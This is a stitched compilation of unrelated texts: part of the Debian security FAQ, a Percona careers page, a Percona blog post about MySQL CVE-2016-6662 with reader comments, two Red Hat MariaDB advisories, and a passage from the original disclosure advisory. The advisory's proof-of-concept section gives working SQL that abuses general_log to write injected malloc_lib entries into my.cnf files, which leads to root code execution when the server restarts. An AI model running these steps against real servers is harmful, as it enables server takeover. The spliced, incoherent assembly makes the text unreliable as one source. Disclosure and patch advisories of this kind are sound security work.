so any change we make can possibly break someone's system. This is
especially true in case of libraries: make sure you never change the
Application Program Interface (API) or Application Binary Interface (ABI),
no matter how small the change is.

This means that moving to a new upstream version is not a good solution,
instead the relevant changes should be backported. Generally upstream
maintainers are willing to help if needed, if not the Debian security team
might be able to help.

In some cases it is not possible to backport a security fix, for example
when large amounts of source code need to be modified or rewritten. If that
happens it might be necessary to move to a new upstream version, but this
has to be coordinated with the security team beforehand.

*Q: The version number for a package indicates that I am still running
a vulnerable version!*

A: Instead of upgrading to a new release we backport security fixes to
the version that was shipped in the stable release. The reason we do
this is to make sure that a release changes as little as possible
so things will not change or break unexpectedly as a result of a
security fix. You can check if you are running a secure version of
a package by looking at the package changelog, or comparing its
exact version number with the version indicated in the Debian
Security Advisory.

*Q: I received an advisory, but the build for one
processor architecture seems to be missing.*

A: Generally the Security Team releases an advisory with builds of the updated
packages for all architectures that Debian supports. However, some architectures
are slower than others and it may happen that builds for most architectures
are ready while some are still missing. These smaller archs represent a small
fraction of our user base. Depending on the urgency of the issue
we may decide to release the advisory forthwith. The missing builds will be
installed as soon as they come available, but no further notice of this will
be given. Of course we will never release an advisory where the i386 or amd64
builds are not present.

*Q: How is security handled for unstable?*

A: Security for unstable is primarily handled by package maintainers, not
by the Debian Security Team. Although the security team may upload
high-urgency security-only fixes when maintainers are noticed to be
inactive, support for stable will always have priority.
If you want to have a secure (and stable) server you are strongly encouraged
to stay with stable.

*Q: How is security handled for testing?*

A: Security for testing benefits from the security efforts of the entire
project for unstable. However, there is a minimum two-day migration delay,
and sometimes security fixes can be held up by transitions. The Security
Team helps to move along those transitions holding back important
security uploads, but this is not always possible and delays may occur.
Especially in the months after a new stable release, when many new versions
are uploaded to unstable, security fixes for testing may lag behind.
If you want to have a secure (and stable) server you are strongly
encouraged to stay with stable.

*Q: How is security handled for contrib,
non-free and non-free-firmware?*

A: The short answer is: it's not. Contrib, non-free and non-free-firmware aren't official
parts of the Debian Distribution and are not released, and thus not
supported by the security team. Some non-free packages are distributed
without source or without a license allowing the distribution of modified
versions. In those cases no security fixes can be made at all. If it
is possible to fix the problem, and the package maintainer or someone else
provides correct updated packages, then the security team will generally
process them and release an advisory.

*Q: The advisory says unstable is fixed in
version 1.2.3-1, but unstable has 1.2.5-1, what's up?*

A: We try to list the first version in unstable that fixed the problem.
Sometimes the maintainer has uploaded even newer versions in the meantime.
Compare the version in unstable with the version we indicate. If it's the
same or higher, you should be safe from this vulnerability. If you want to
be sure, you can check the package changelog with apt-get changelog
package-name and search for the entry announcing the fix.

*Q: Why are there no official mirrors for security.debian.org?*

A: Actually, there are. There are several official mirrors, implemented
through DNS aliases. The purpose of security.debian.org is to make security
updates available as quickly and easily as possible.

Encouraging the use of unofficial mirrors would add extra complexity
that is usually not needed and that can cause frustration if these
mirrors are not kept up to date.

*Q: I've seen DSA 100 and DSA 102, now where is DSA 101?*

A: Several vendors (mostly of GNU/Linux, but also of BSD
derivatives) coordinate security advisories for some incidents and
agree to a particular timeline so that all vendors are able to
release an advisory at the same time. This was decided in order to
not discriminate some vendors that need more time (e.g. when the
vendor has to pass packages through lengthy QA tests or has to
support several architectures or binary distributions). Our own
security team also prepares advisories in advance. Every now and
then, other security issues have to be dealt with before the parked
advisory could be released, and hence temporarily leaving out one or
more advisories by number.

*Q: How can I reach the security team?*

A: Security information can be sent to security@debian.org or
team@security.debian.org, both of which are read by the members of
the security team.

If desired, email can be encrypted with the Debian Security
Contact key (key ID [0x0D59D2B15144766A14D241C66BAF400B05C3E651](https://keyserver.ubuntu.com/pks/lookup?op=get&search=0x0d59d2b15144766a14d241c66baf400b05c3e651)). For the OpenPGP keys of individual team members, please
refer to the [keyring.debian.org](https://keyring.debian.org/)
keyserver.

*Q: I guess I found a security problem, what should I do?*

A: If you learn about a security problem, either in one of your own
packages or in someone else's please always contact the security team. If
the Debian security team confirms the vulnerability and other vendors are
likely to be vulnerable as well, they usually contact other vendors as
well. If the vulnerability is not yet public they will try to coordinate
security advisories with the other vendors, so all major distributions are
in sync.

If the vulnerability is already publicly known, be sure to file a bug
report in the Debian BTS, and tag it security.

If you are a Debian maintainer, [see below](#care).

*Q: What am I supposed to do with a security problem in one of
my packages?*

A: If you learn of a security problem, either in your package or
someone else's please always contact the security team via email at
team@security.debian.org. They keep track
of outstanding security problems, can help maintainers with
security problems or fix problems on their own, are responsible for
sending out security advisories and maintaining
security.debian.org.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

It's particularly important that you don't upload to any other
distribution other than unstable without prior agreement by the
security team, because bypassing them will cause confusion and more
work.

*Q: I tried to download a package listed in one of the security
advisories, but I got a `file not found' error.*

A: Whenever a newer bugfix supersedes an older package on
security.debian.org, chances are high that the old package will be
removed by the time the new one gets installed. Hence, you'll get
this `file not found' error. We don't want to distribute packages
with known security bugs longer than absolutely necessary.

Please use the packages from the latest security advisories, which are
distributed through the [debian-security-announce](https://lists.debian.org/debian-security-announce/) mailing list. It's best to simply run
`apt-get update` before upgrading the package.

*Q: I've got a bugfix, can I upload to security.debian.org directly?*

A: No, you can't. The archive at security.debian.org is maintained
by the security team, who have to approve all packages. You should
instead send patches or proper source packages to the security team
via team@security.debian.org. They will be
reviewed by the security team and eventually uploaded, either with
or without modifications.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I've got a bugfix, can I upload to proposed-updates instead?*

A: Technically speaking, you can. However, you should not do this,
since this interferes badly with the work of the security team.
Packages from security.debian.org will be copied into the
proposed-updates directory automatically. If a package with the
same or a higher version number is already installed into the
archive, the security update will be rejected by the archive
system. That way, the stable distribution will end up without a
security update for this package instead, unless the wrong
packages in the proposed-updates directory were rejected. Please contact the
security team instead and include all details of the vulnerability
and attach the source files (i.e. diff.gz and dsc files) to your mail.

The [Developer's Reference](../doc/developers-reference/pkgs.html#bug-security) has complete instructions on what to do.

*Q: I'm pretty sure my packages are fine,
how can I upload them?*

A: If you are very sure that your packages don't break anything, that the
version is sane (i.e. greater than the version in stable and less than the
version in testing/unstable), that you didn't change the behaviour of the
package, despite the corresponding security problem, that you compiled it
for the correct distribution (that is `oldstable-security` or
`stable-security`), that the package contains the original
source if the package is new on security.debian.org, that you can confirm
the patch against the most recent version is clean and only touches the
corresponding security problem (check with `interdiff -z` and
both `.diff.gz` files), that you have proofread the patch at
least thrice, and that `debdiff` doesn't display any changes,
you may upload the files into the incoming directory
`ftp://ftp.security.upload.debian.org/pub/SecurityUploadQueue` on the
security.debian.org directly. Please send a notification with all details
and links to team@security.debian.org as well.

*Q: How can I help with security?*

A: Please review each problem before reporting it to
security@debian.org. If you are able to provide patches, that
would speed up the process. Do not simply forward bugtraq mails,
because we already receive them — but do provide us with
additional information about things reported on bugtraq.

A good way to get started with security work is helping
out on the Debian Security Tracker ([instructions](https://security-tracker.debian.org/tracker/data/report)).

*Q: What is the scope of proposed-updates?*

A: This directory contains packages which are proposed to enter the
next revision of Debian stable. Whenever packages are uploaded by
a maintainer for the stable distribution, they end up in the
proposed-updates directory. Since stable is meant to be stable, no
automatic updates are made. The security team will upload fixed
packages mentioned in their advisories to stable, however they will
be placed in proposed-updates first. Every couple of months the
Stable Release Manager checks the list of packages in
proposed-updates and discusses whether a package is suited for
stable or not. This is compiled into another revision of stable
(e.g. 2.2r3 or 2.2r4). Packages that don't fit will probably be
rejected and dropped from proposed-updates as well.

Note that the packages uploaded by maintainers (not by the security team)
in the proposed-updates/ directory are not supported by the security
team.

*Q: How is the security team composed?*

A: The Debian security team consists of
[several officers and secretaries](../intro/organization#security).
The security team itself appoints people to join the team.

*Q: How long will security updates be provided?*

A: The security team will support a stable distribution for
three years after its release. It is not possible to support three
distributions; supporting two simultaneously is already difficult
enough.

*Q: How can I check the integrity of packages?*

A: This process involve checking the Release file signature against
the [public key](https://ftp-master.debian.org/keys.html) used for the archive. The Release file contains the
checksums of Packages and Sources files, which contain
checksums of binary and source packages. Detailed instruction on how
to check packages integrity can be found in the [Debian Securing Manual](../doc/manuals/securing-debian-howto/ch7#s-deb-pack-sign).

*Q: What to do if a random package breaks after a security update?*

A: First of all, you should figure out why the package breaks and
how it is connected to the security update, then contact the
security team if it is serious or the stable release manager if it
is less serious. We're talking about random packages that break
after a security update of a different package. If you can't
figure out what's going wrong but have a correction, talk to the
security team as well. You may be redirected to the stable release
manager though.

*Q: What is a CVE identifier?*

A: The Common Vulnerabilities and Exposures project assignes
unique names, called CVE identifiers, to specific security
vulnerabilities, to make it easier to uniquely refer to a specific
issue. More information can be found at [Wikipedia](https://en.wikipedia.org/wiki/Common_Vulnerabilities_and_Exposures).

*Q: Does Debian issue a DSA for every CVE id?*

A: The Debian security team keeps track of every issued CVE identifier,
connect it to the relevant Debian package and assess its impact in a
Debian context - the fact that something is assigned a CVE id does not
necessarily imply that the issue is a serious threat to a Debian system.
This information is tracked in the
[Debian Security Tracker](https://security-tracker.debian.org)
and for the issues that are considered serious a Debian Security Advisory
will be issued.

Low-impact issues not qualifying for a DSA can be fixed in the next
release of Debian, in a point release of the current stable or oldstable
distributions, or are included in a DSA when that is being issued for a
more serious vulnerability.

*Q: Can Debian assign CVE identifiers?*

A: Debian is a CVE Numbering Authority and can assign ids, but per
CVE policy only to yet-undisclosed issues. If you have an undisclosed
security vulnerability for software in Debian and would like to get an
identifier for it, contact the Debian Security Team. For cases where the
vulnerability is already public, we advise to follow the procedure
detailed in the [CVE OpenSource Request HOWTO](https://github.com/RedHatProductSecurity/CVE-HOWTO).

*Q: Does Debian have a vulnerability disclosure policy?*

A: Debian has published a [vulnerability
disclosure policy](disclosure-policy) as part of its participation in the CVE
program.

*Q: Our vulnerability management tool
has shown that the following issues are open (list of CVEs with random CVSS
scores). When are those going to be fixed?*

A: Debian does not provide CVSS scores and doesn't use CVSS scores from
external sources when triaging security issues.

You can check the state of every single CVE ID in the Debian Security Tracker by accessing
it by [ID](https://security-tracker.debian.org/tracker/CVE-ID).

The "Notes" section will contain additional information, e.g. that a security issue doesn't
warrant a Debian security update, but might get fixed in a subsequent point release.

A list of packages for which a Security update is planned can be found at the
[dsa-needed list](https://salsa.debian.org/security-tracker-team/security-tracker/raw/master/data/dsa-needed.txt).

If you find an error in triage data, you're very welcome to report it. The Debian Security Team will
however not generally react to requests asking for more specific information, you should instead contact
the vendor of your vulnerability management tool, after all they are the ones who alerted you about a
security issue and not Debian.

# Deprecated Debian security FAQ

*Q: What does local (remote) mean?*

**The field *Problem type* in DSA mails is not used since April 2014.**

A: Some advisories cover vulnerabilities that cannot be identified
with the classic scheme of local and remote exploitability. Some
vulnerabilities cannot be exploited from remote, i.e. don't
correspond to a daemon listening to a network port. If they can be
exploited by special files that could be provided via the network
while the vulnerable service is not permanently connected with the
network, we write local (remote) in such cases.

Such vulnerabilities are somewhat between local and remote
vulnerabilities and often cover archives that could be provided
through the network, e.g. as mail attachment or from a download
page.

# Percona Careers

Live and work from anywhere!

[Find your next role](#get-started)

### Remote by Design

Since its founding in 2006, Percona has always been a remote company. The reason? It’s a tech company that knows how to use technology effectively and doesn’t want to have geography limit its talent pool, said CEO Ann Schlemmer.
![](data:image/svg+xml...)

We have a high degree of trust with our staff. Leaders aren’t checking to see what time workers log in each day or moni toring if their light on Slack is green. You can’t have that sort of behavior and have an effective remote company. I have pride in how we live our values. That’s one of our values: We don’t care where you’re located... If someone is a digital nomad and that’s their lifestyle and that makes them happiest, I think that brings productivity. The goal is for employees to get their work done and then just enjoy life.”
![](data:image/svg+xml...)
**Ann Schlemmer**
CEO Percona

![](data:image/svg+xml...)

Every day at Percona, I am fortunate to collaborate with exceptional colleagues across every department, creating an environment where expertise is all around us. Our collective excellence is not only a daily inspiration, but it also raises the performance bar for everyone. I am truly grateful to be a part of a culture where our commitment to core values is palpable, driving our unwavering dedication to delivering for our customers, community, and colleagues. We rarely have a boring day here at Percona!”

**Bennie Grant**
COO Percona

# Percona Server Critical Update CVE-2016-6662

September 12, 2016

[David Busby](https://www.percona.com/blog/author/david-busby)

[![CVE-2016-6662](data:image/svg+xml...)](https://www.percona.com/blog/wp-content/uploads/2016/09/CVE-2016-6662.jpg)This blog is an announcement for a Percona Server update with regards to CVE-2016-6662.

[From seclist.org](http://seclists.org/oss-sec/2016/q3/481):

An independent research has revealed multiple severe MySQL vulnerabilities. This advisory focuses on a critical vulnerability with a CVEID of CVE-2016-6662. The vulnerability affects MySQL servers in all version branches (5.7, 5.6, and 5.5) including the latest versions, and could be exploited by both local and remote attackers.

Both the authenticated access to MySQL database (via network connection or web interfaces such as phpMyAdmin) and SQL Injection could be used as exploitation vectors. Successful exploitation could allow attackers to execute arbitrary code with root privileges which would then allow them to fully compromise the server on which an affected version of MySQL is running.

This is a **CRITICAL** update, and the fix mitigates the potential for **remote root code execution**.

We encourage our users to update to the latest version of their particular fork as soon as possible, ensuring they have appropriate change management procedures in place beforehand so they can test the update before placing it into production.

Percona would like to thank Dawid Golunski of <http://legalhackers.com/> for disclosing this vulnerability in the MySQL software, and working with us to resolve this problem.

What about the Percona-XtraDB-Cluster package?

Ah So I’m not the only one. I thought I had caching issues somewhere or something. But it seems XtraDB has not been patched yet.

This should be pattched in 5.5.41-25.11.1 onward for PXC (<https://www.percona.com/blog/2016/09/22/percona-xtradb-cluster-5-5-41-25-11-1-is-now-available/>)

Just curious if Percona XtraDB Cluster is also affected… And when to expect patches, if yes.

@Remco
 As confirmed by percona in mail to users, For that release will come next week.

What about those who were already on percona 5.7.14 7 before this Announcement .Was earlier Binary already patched or need to re download latest binaries.

 0  ![Mike Waddle](data:image/svg+xml...) Mike Waddle    8 years ago

We ran into memory issues after going from 5.6.23 to this patch. Suspect a memory leak.

 0   ![scaarup](data:image/svg+xml...) scaarup    Reply to   [Mike Waddle](#comment-10967015)   8 years ago

How did you identify this? Is this potential bug tracked elsewhere?

It appears that we ran into a memory leak as well.

 0  ![krushik](data:image/svg+xml...) krushik    Reply to   [Mike Waddle](#comment-10967015)   8 years ago

Yep. I already narrowed it to this 5.6.32-78.0 update. There is no such memory leak in 5.6.31-77.0. Somebody also reported the similar problem for 5.7: <https://www.percona.com/forums/questions-discussions/mysql-and-percona-server/percona-server-5-7/45836-memory-usage-and-swap-usage-percona-server-5-7-mysql-5-7>

Anyone affected by this memory leak – are you using the audit log plugin?

 0  ![ram](data:image/svg+xml...) [ram](https://www.24x7serversupport.com/)    8 years ago

Anybody is using the audit log plugin?

The link for “Percona Server 5.6.32-78.1” is not correct!

## Topic

An update for mariadb-galera is now available for Red Hat Enterprise Linux OpenStack Platform 6.0 (Juno) for RHEL 7.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MariaDB is a multi-user, multi-threaded SQL database server that is binary compatible with MySQL. Galera is a synchronous multi-master cluster for MariaDB.

Security Fix(es):

* It was discovered that the MySQL logging functionality allowed writing to MySQL configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)

Bug Fix(es):

* Because Red Hat Enterprise Linux 7.3 changed the return format of the "systemctl is-enabled" command as consumed by shell scripts, the mariadb-galera RPM package, upon installation, erroneously detected that the MariaDB service was enabled when it was not. As a result, the Red Hat OpenStack Platform installer, which then tried to run mariadb-galera using Pacemaker and not systemd, failed to start Galera. With this update, mariadb-galera's RPM installation scripts now use a different systemctl command, correctly detecting the default MariaDB as disabled, and the installer can succeed. (BZ#1376909)
* Previously, both the mariadb-server and mariadb-galera-server packages shipped the client-facing libraries, dialog.so and mysql\_clear\_password.so. As a result, the mariadb-galera-server package would fail to install because of package conflicts. With this update, these libraries have been moved from mariadb-galera-server to mariadb-libs, and the mariadb-galera-server package installs successfully. (BZ#1376903)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MariaDB server daemon (mysqld) will be restarted automatically.

## Affected Products

[View affected systems](https://console.redhat.com/insights/patch/advisories/RHSA-2016%3A2131)

## Topic

An update for mariadb55-mariadb is now available for Red Hat Software Collections.

Red Hat Product Security has rated this update as having a security impact of Important. A Common Vulnerability Scoring System (CVSS) base score, which gives a detailed severity rating, is available for each vulnerability from the CVE link(s) in the References section.

## Description

MariaDB is a multi-user, multi-threaded SQL database server. For all practical purposes, MariaDB is binary-compatible with MySQL.

The following packages have been upgraded to a newer upstream version: mariadb55-mariadb (5.5.53).

Security Fix(es):

* It was discovered that the MariaDB logging functionality allowed writing to MariaDB configuration files. An administrative database user, or a database user with FILE privileges, could possibly use this flaw to run arbitrary commands with root privileges on the system running the database server. (CVE-2016-6662)
* A race condition was found in the way MariaDB performed MyISAM engine table repair. A database user with shell access to the server running mysqld could use this flaw to change permissions of arbitrary files writable by the mysql system user. (CVE-2016-6663)
* This update fixes several vulnerabilities in the MariaDB database server. Information about these flaws can be found on the Oracle Critical Patch Update Advisory page, listed in the References section. (CVE-2016-3492, CVE-2016-5612, CVE-2016-5616, CVE-2016-5624, CVE-2016-5626, CVE-2016-5629, CVE-2016-8283)

## Solution

For details on how to apply this update, which includes the changes described in this advisory, refer to:

<https://access.redhat.com/articles/11258>

After installing this update, the MariaDB server daemon (mysqld) will be restarted automatically.

III. INTRODUCTION
-------------------------

An independent research has revealed multiple severe MySQL vulnerabilities.
This advisory focuses on a critical vulnerability with a CVEID of CVE-2016-6662
which can allow attackers to (remotely) inject malicious settings into MySQL
configuration files (my.cnf) leading to critical consequences.

The vulnerability affects all MySQL servers in default configuration in all
version branches (5.7, 5.6, and 5.5) including the latest versions, and could
be exploited by both local and remote attackers.
Both the authenticated access to MySQL database (via network connection or web
interfaces such as phpMyAdmin) and SQL Injection could be used as exploitation
vectors.

As SQL Injection attacks are one of the most common issues in web applications,
the CVE-2016-6662 vulnerabilty could put web applications at a critical risk in
case of a successful SQL Injection attack.

A successful exploitation could allow attackers to execute arbitrary code with
root privileges which would then allow them to fully compromise the server on
which an affected version of MySQL is running.

The vulnerability can be exploited even if security modules SELinux and AppArmor
are installed with default active policies for MySQL service on major Linux
distributions.

This advisory provides a Proof-Of-Concept MySQL exploit which demonstrates how
Remote Root Code Execution could be achieved by attackers.

IV. DESCRIPTION
-------------------------

The default MySQL package comes with a mysqld_safe script which is used by many
default installations/packages of MySQL as a wrapper to start the MySQL service
process which can observed, for example, in case of the following fully-updated
Debian system:

root@debian:~# lsb_release -a
No LSB modules are available.
Distributor ID:	Debian
Description:	Debian GNU/Linux 8.5 (jessie)
Release:	8.5
Codename:	jessie

root@debian:~# dpkg -l | grep -i mysql-server
ii  mysql-server                        5.5.50-0+deb8u1
ii  mysql-server-5.5                    5.5.50-0+deb8u1
ii  mysql-server-core-5.5               5.5.50-0+deb8u1

After starting MySQL (installed from packages provided in the default Debian repositories) by running

root@debian:~# service mysql start

or, alternatively:

root@debian:~# /etc/init.d/mysql start

The MySQL server process tree looks as follows:

root     14967  0.0  0.1   4340  1588 ?        S    06:41   0:00 /bin/sh /usr/bin/mysqld_safe

mysql    15314  1.2  4.7 558160 47736 ?        Sl   06:41   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/mysql/plugin --user=mysql --log-error=/var/log/mysql/error.log --pid-file=/var/run/mysqld/mysqld.pid --socket=/var/run/mysqld/mysqld.sock --port=3306

As can be seen, the mysqld_safe wrapper script is executed as root, whereas the
main mysqld process drops its privileges to mysql user.

The wrapper script has the following function :

----[ /usr/bin/mysqld_safe ]----

[...]

# set_malloc_lib LIB
# - If LIB is empty, do nothing and return
# - If LIB is 'tcmalloc', look for tcmalloc shared library in /usr/lib
#   then pkglibdir.  tcmalloc is part of the Google perftools project.
# - If LIB is an absolute path, assume it is a malloc shared library
#
# Put LIB in mysqld_ld_preload, which will be added to LD_PRELOAD when
# running mysqld.  See ld.so for details.
set_malloc_lib() {
  malloc_lib="$1"

  if [ "$malloc_lib" = tcmalloc ]; then
    pkglibdir=`get_mysql_config --variable=pkglibdir`
    malloc_lib=
    # This list is kept intentionally simple.  Simply set --malloc-lib
    # to a full path if another location is desired.
    for libdir in /usr/lib "$pkglibdir" "$pkglibdir/mysql"; do
      for flavor in _minimal '' _and_profiler _debug; do
        tmp="$libdir/libtcmalloc$flavor.so"
        #log_notice "DEBUG: Checking for malloc lib '$tmp'"
        [ -r "$tmp" ] || continue
        malloc_lib="$tmp"
        break 2
      done
    done

[...]

----------[ eof ]---------------

which can be used to preload a shared library before starting the server.

The library can be set with the following parameter:

--malloc-lib=LIB

This parameter can also be specified within a mysql config file (my.cnf)
in a '[mysqld]' or '[mysqld_safe]' section.

If an attacker managed to inject a path to their malicious library within the
config, they would be able to preload an arbitrary library and thus execute
arbitrary code with root privileges when MySQL service is restarted.
The restart could be triggered manually, via a system update, package update
(including an update of dependencies), system reboot etc.).
Attackers might also be able to speed up the server restart remotely by issuing
a SHUTDOWN SQL statement or 'shutdown' command via mysqladmin.

In 2003 a vulnerability was disclosed in MySQL versions before 3.23.55 that
allowed users to create mysql config files with a simple statement:

SELECT * INTO OUTFILE '/var/lib/mysql/my.cnf'

The issue was fixed by refusing to load config files with world-writable
permissions as these are the default permissions applied to files created
by OUTFILE query.
As an additional protection, OUTFILE/DUMPFILE statements are prohibited from
overwrite existing files.
This protects existing configuration files.
The old vulnerability has been considered fixed ever since the MySQL 3.23.55
was released in 2003, and writing to configuration files has been considered
impossible.

However, the V. PROOF OF CONCEPT section below will show that it is possible to
successfully bypass current restrictions by abusing MySQL logging functions
(available in every MySQL install by default) to achieve the following:

1) Inject malicious configuration into existing MySQL configuration files on
systems with weak/improper permissions (configs owned by/writable by mysql user)
(SCENARIO 1).

2) Create new configuration files within a MySQL data directory (writable
by MySQL by default) on _default_ MySQL installs without the need to rely on
improper config permissions (SCENARIO 2).

3) Attackers with only SELECT/FILE permissions can gain access to logging
functions (normally only available to MySQL admin users) on all of the
_default_ MySQL installations and thus be in position to add/modify MySQL
config files.

Update (16/09/2016):
The proof of concept details below should be read closely as there have been
some misconceptions noticed on some security forums which incorrectly try
to lessen the severity of this vulnerability due to a lack of correct
understanding of the issues presented in this advisory.
It should be noted that:

* SCENARIO 2 (point 2 above) is _independent_ of SCENARIO 1 (point 1 above).
I.e the config injection vulnerability which ultimately leads to loading
arbitrary malicious shared libraries CAN be exploited EVEN if there are NO
my.cnf config files with insecure permissions available on the system.
In other words, weak permissions are NOT a requirement for exploitation, and
the vulnerability CAN be exploit on affected DEFAULT PerconaDB/MariaDB/MySQL
installations with CORRECT permissions set on ALL my.cnf files available on
the system by default.
The SCENARIO 1 has only been presented as it makes the exploit code much
simpler and allows to explain the logging abuse/config injection vulnerability
without exposing default installations (SCENARIO 2) to an immediate risk.

* The researcher has created a private working PoC that has not been shared
publicly which CAN successfully exploit SCENARIO 2 (default setup/no incorrect
permissions on any of the default my.cnf config files). As noted both in the
section below as well as in the current PoC exploit's comments, the current
PoC is limited. It has been purposefully limited to protect immediate
exploitation of default installations (no incorrect perms on my.cnf) and give
users time to react to the vulnerability.

* A successful exploitation of SCENARIO 2 (no my.cnf available with weak perms)
leading to root privilege escalation/code execution can _ALSO_ (however is NOT a
requirement) be achieved by means of a (separate) vulnerability: CVE-2016-6663.
PoC has been created by the author of this advisory but not released publicly.

* The logging facility CAN be accessed by standard users with SELECT/FILE
privileges only. I.e SUPER privilege is NOT required to create malicious triggers
which contain the malicious payload that grants the attacker access to the
logging facility DESPITE the LACK of administrative privileges.
This has been explained in the section below (see point 3 in the section below)
and proven in the current PoC in this advisory and can also be observed in the
replication steps (see VI. section) that show the attacker database account
permissions (the attacker DB account is NOT assigned SUPER permissions).

* The exploitation requires a restart that could happen via a number of ways.
Attackers might also be able to speed up the server restart remotely by issuing
a SHUTDOWN SQL statement or 'shutdown' command via mysqladmin.

V. PROOF OF CONCEPT
-------------------------

1) Inject malicious configuration into existing MySQL configuration files on
systems with weak/improper permissions (configs owned by/writable by mysql user).
(SCENARIO 1)
~~~~~~~~~~~~~~~~~~~~~~~~~

MySQL configuration files are loaded from all supported locations and processed
one by one when mysqld_safe script is executed.

Exact config locations depend on MySQL version.
For example, as described on:
<http://dev.mysql.com/doc/refman/5.5/en/option-files.html>
for MySQL 5.5 the config locations include:

/etc/my.cnf	        Global options
/etc/mysql/my.cnf	Global options
SYSCONFDIR/my.cnf	Global options
$MYSQL_HOME/my.cnf	Server-specific options
defaults-extra-file	The file specified with --defaults-extra-file=file_name, if any
~/.my.cnf	User-specific options

There is a common misconception that mysql config files should be owned by mysql
user for the server to work properly.
Many installation guides, or even security guides often wrongly advise users
to set the ownership of mysql config files/directories such as /etc/mysql
or /etc/my.cnf to mysql user.

For example:
<https://github.com/willfong/mariadb-backup/blob/master/README.md>
says:

"Lock down permissions on config file(s)

chown mysql /etc/my.cnf
chmod 600 /etc/my.cnf"

Whereas the article at:
<http://www.devshed.com/c/a/mysql/security-issues-with-mysql/>
mentions:

"You should also protect the global option file, /etc/my.cnf, if it exists.
The mysql user should own it and have read/write access to it, but other users
need only read access:

shell> chown mysql /etc/my.cnf"

Moreover, there are also MySQL recipes for installation automation software
such as Chef that also provide users with vulnerable permissions on my.cnf
config files.

If any of the MySQL config files is owned by mysql user, an attacker could
append malicious config entries to it as follows:

root@debian:~/# ls -l /etc/my.cnf
-rw-r--r-- 1 mysql mysql 72 Jul 28 17:20 /etc/my.cnf

root@debian:~/# cat /etc/my.cnf

[mysqld]

key_buffer              = 16M
max_allowed_packet      = 16M

Attacker could run the following SQL queries:

mysql> set global general_log_file = '/etc/my.cnf';
mysql> set global general_log = on;
mysql> select '
    '>
    '> ; injected config entry
    '>
    '> [mysqld]
    '> malloc_lib=/tmp/mysql_exploit_lib.so
    '>
    '> [separator]
    '>
    '> ';
1 row in set (0.00 sec)
mysql> set global general_log = off;

The resulting config would then have the following part appended:

root@debian:~/# cat /etc/my.cnf

[mysqld]

key_buffer              = 16M
max_allowed_packet      = 16M

/usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
160728 17:25:14	   40 Query	select '

; injected config entry

[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so

[separator]

'
160728 17:25:15	   40 Query	set global general_log = off

This config contains some redundant information that would normally cause MySQL
to fail to startup during a restart due to parsing issues.

However, the important part is that the config now contains the section:

[mysqld]
malloc_lib=/tmp/mysql_exploit_lib.so

mysqld_safe will read the shared library path correctly and add it to
the LD_PRELOAD environment variable before the startup of mysqld daemon.
The preloaded library can then hook the libc fopen() calls and clean up
the config before it is ever processed by mysqld daemon in order for it
to start up successfully so that the compromise goes unnoticed by the
system administrators etc.

~~~~~~~~~~~~~~~~~~~~~~~~~
2) Create new configuration files within a MySQL data directory (writable
by MySQL by default) on _default_ MySQL installs without the need to rely on
improper config permissions.
(SCENARIO 2)

Analysis of the mysqld_safe script has shown that in addition to the
config locations provided above, mysqld_safe also loads the configuration file
from the mysql data directory (/var/lib/mysql/my.cnf) by default as can be
seen below:

----[ /usr/bin/mysqld_safe ]----

[...]
# Try where the binary installs put it
if test -d $MY_BASEDIR_VERSION/data/mysql
then
  DATADIR=$MY_BASEDIR_VERSION/data
  if test -z "$defaults" -a -r "$DATADIR/my.cnf"
  then
    defaults="--defaults-extra-file=$DATADIR/my.cnf"
  fi
[...]

----------[ eof ]---------------

on MySQL versions in branches 5.5 and 5.6.
The datadir location for my.cnf has only been removed from MySQL starting
from 5.7 branch however in many configurations it will still load config
from:

/var/lib/mysql/.my.cnf

The data directory /var/lib/mysql is (obviously) writable by mysql user on
every install:

root@debian:~# ls -ld /var/lib/mysql/
drwx------ 4 mysql mysql 4096 Jul 28 06:41 /var/lib/mysql/

Therefore, if no mysql-owned configs are available on the system, an attacker
could still be able to exploit the vulnerability by creating a config at the
following locations:

/var/lib/mysql/my.cnf
/var/lib/mysql/.my.cnf

As mentioned, using FILE permission to create such a file with the SQL statement:

SELECT 'malicious config entry' INTO OUTFILE '/var/lib/mysql/my.cnf'

would not work, as MySQL creates files with rw permissions for the world:

-rw-rw-rw- 1 mysql mysql 4 Jul 28 07:46 /var/lib/mysql/my.cnf

and MySQL would prevent such world-writable config from being loaded at startup.

Attackers could bypass this however by using these logging SQL statements:

mysql> set global general_log_file = '/var/lib/mysql/my.cnf';
mysql> set global general_log = on;
mysql> select '
    '>
    '> ; injected config entry
    '>
    '> [mysqld]
    '> malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so
    '>
    '> [separator]
    '>
    '> ';
1 row in set (0.00 sec)
mysql> set global general_log = off;

The queries will create the my.cnf file with the necessary permissions
(without o-w bit) for it to be parsed by the MySQL daemon:

# ls -l /var/lib/mysql/my.cnf
-rw-rw---- 1 mysql mysql 352 Jul 28 17:48 /var/lib/mysql/my.cnf

The file will have the following contents:

# cat /var/lib/mysql/my.cnf
/usr/sbin/mysqld, Version: 5.5.50-0+deb8u1 ((Debian)). started with:
Tcp port: 3306  Unix socket: /var/run/mysqld/mysqld.sock
Time                 Id Command    Argument
160728 17:48:22	   43 Query	select '

; injected config entry

[mysqld]
malloc_lib=/var/lib/mysql/mysql_hookandroot_lib.so

[separator]

'
160728 17:48:23	   43 Query	set global general_log = off

One problem will remain however. MySQL will refuse files that do not start with
a valid [section] header with the message:

error: Found option without preceding group in config file: /var/lib/mysql/my.cnf at line: 1
Fatal error in defaults handling. Program aborted

Further testing has however proven that IT IS possible to bypass this security
restriction as well but this will not be included in this advisory/PoC for the
time being.

It is worth to note that attackers could use one of the other vulnerabilities
discovered by the author of this advisory which has been assigned a CVEID of
CVE-2016-6663 and is pending disclosure.
